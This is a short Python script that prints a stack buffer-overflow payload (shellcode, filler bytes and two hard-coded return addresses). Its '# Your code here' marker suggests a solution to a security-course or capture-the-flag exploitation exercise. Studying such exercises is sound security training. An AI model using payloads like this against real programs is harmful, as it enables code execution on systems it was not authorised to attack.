#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
sys.stdout.buffer.write(shellcode + (b"\x01"*(2048 - 23)) + b"\x10\x95\xfe\xff" + b"\x1C\x9D\xfe\xff")
